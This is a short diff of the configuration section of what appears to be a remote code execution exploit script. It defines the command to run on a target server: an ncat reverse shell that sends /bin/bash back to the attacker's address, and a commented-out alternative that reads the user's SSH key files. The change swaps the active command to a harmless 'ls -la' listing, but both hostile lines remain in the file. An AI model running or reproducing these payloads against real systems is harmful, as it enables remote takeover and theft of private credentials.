@@ -31,7 +31,7 @@ NCAT="/usr/bin/ncat"
 # The remote command to run on the server!
 # ================================================
 RCE="ncat ${SRC_ADDR} ${RCE_PORT} -e /bin/bash &"
-#RCE="ls -la"
+RCE="ls -la"
 #RCE="cat ~/.ssh/*"
 # ================================================
 
